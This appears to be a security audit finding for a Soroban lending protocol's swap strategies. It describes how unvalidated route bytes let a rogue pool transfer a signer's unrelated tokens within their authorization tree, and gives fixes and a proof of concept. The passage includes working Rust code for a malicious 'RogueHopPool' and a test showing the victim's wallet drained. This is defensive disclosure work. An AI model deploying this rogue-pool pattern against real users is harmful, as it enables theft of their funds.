### Title
Unsanitized swap route bytes let an attacker inject arbitrary contract calls beneath the caller's authorization tree - (File: contracts/controller/src/strategies/swap.rs)

### Summary
`multiply`, `swap_debt`, `swap_collateral`, `repay_debt_with_collateral`, and the direct router path all accept caller-supplied `swap: Bytes` and forward them verbatim to the configured router without decoding or constraining the route. The route payload names the pool and token addresses the router invokes, and the router keeps no allowlist. A malicious route therefore executes arbitrary third-party contract code inside the same authorization tree as the caller's `require_auth`, so a token `transfer` out of the signer's wallet is recorded as a legitimate child of the signed invocation and executes if the tree is signed. This is the contract-level analog of CWE-88 argument injection: attacker-controlled input reaches an invocation sink without sanitization.

### Finding Description
The CVE class is "attacker-controlled argument reaches a process/call invocation without sanitization or mitigation flags". In XOXNO Lending, the sink is the router call in `swap_tokens`: the controller builds `StrategySwap` bytes into `router.execute_strategy(&controller, &amount_in, swap)` under a flash guard, having authorized only one exact input `transfer` [1](#0-0) . The `swap` bytes are never decoded or validated against the market assets by the controller; the only checks are `!swap.is_empty()` and measured post-call input/output balances [2](#0-1) . The threat model itself records that the router "calls the pool and token addresses its payload names and keeps no allowlist of them, so a route can put third-party code on the call stack below the caller's authorization" and that the resulting loss is "the caller's wallet, not the routed amount" [3](#0-2) . The repository contains a working exploit fixture: `RogueHopPool` invoked through `UnlistedPoolRouter` performs `token.transfer(alice -> attacker, WALLET_BALANCE)`, and the test proves the stolen transfer is recorded as a child of Alice's `swap_collateral` auth entry and drains her wallet while her position still receives the fair output [4](#0-3) .

### Impact Explanation
Theft of user funds: any token the signer holds (unrelated to the swapped position) can be transferred to the attacker inside the signed invocation tree, unbounded by the routed amount, the payload minimum, or the final risk gate [5](#0-4) . The swap itself settles correctly — fair output is credited — so the drain is invisible to the controller's measured-settlement checks [6](#0-5) .

### Likelihood Explanation
Reachable by a single unprivileged address through `swap_collateral`, `swap_debt`, `multiply`, `repay_debt_with_collateral` (controller `lib.rs` [7](#0-6) ) or direct `execute_strategy`. The attacker must get the victim to sign a poisoned route — e.g., served through a compromised or malicious quote path — since the controller's empty/non-empty route checks do not inspect route contents [8](#0-7) . The attack requires the signer to accept an auth tree containing an unexpected child invocation; wallets/simulators that display only the root call, or clients that skip tree inspection, make this practical, which is precisely the CWE-88 precondition (missing sanitization, mitigation delegated to the caller). Medium severity: real theft path, but gated on signing a malformed auth tree.

### Recommendation
Constrain the injection surface on-chain rather than relying on client-side tree inspection:
- Have the controller (or router) decode `StrategySwap` and enforce an allowlist of hop pool/venue contracts and token addresses that must equal the declared `token_in`/`token_out` markets.
- Alternatively, sandbox router execution so the only signer-authorized call is the exact input transfer — e.g., route through an intermediate contract address holding no user auth, or require `require_auth_for_args` scoped so no user token transfer can attach beneath the strategy invocation.
- Document and enforce (in SDK/builders) rejection of any recorded auth tree whose children include calls other than the single expected input `transfer` [9](#0-8) .

### Proof of Concept
Working exploit already in the tree at `tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs`:

1. Attacker deploys `RogueHopPool(victim=Alice, token=wallet_token, to=attacker, amount=WALLET_BALANCE)` [10](#0-9) .
2. Attacker encodes `RoutedSwap { hop_pool: rogue, min_out: FAIR_OUT_ETH, token_in: USDC, token_out: ETH }` into the `swap` bytes [11](#0-10) .
3. Alice submits `swap_collateral(caller=alice, account_id, current=USDC, amount, new=ETH, swap)`; the controller forwards the bytes via `execute_strategy`, the router invokes `rogue.swap()`, which transfers Alice's unrelated wallet token to the attacker [12](#0-11) .
4. The recorded auth tree shows the stolen `transfer` as a child of Alice's `swap_collateral` entry; `wallet(alice) == 0`, `wallet(attacker) == WALLET_BALANCE`, and her position still received `FAIR_OUT_ETH`, so all settlement gates pass [13](#0-12) .

    pub fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        sender.require_auth();
        let route = RoutedSwap::from_xdr(&env, &swap_xdr).expect("route must decode");
        let router = env.current_contract_address();
        token::Client::new(&env, &route.token_in).transfer(&sender, &router, &total_in);

        token::Client::new(&env, &route.token_out).transfer(&router, &sender, &route.min_out);
        route.min_out
    }

/// Attacker-deployed "pool". `amount == 0` is the benign control.
#[contract]
pub struct RogueHopPool;

#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
    }

#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
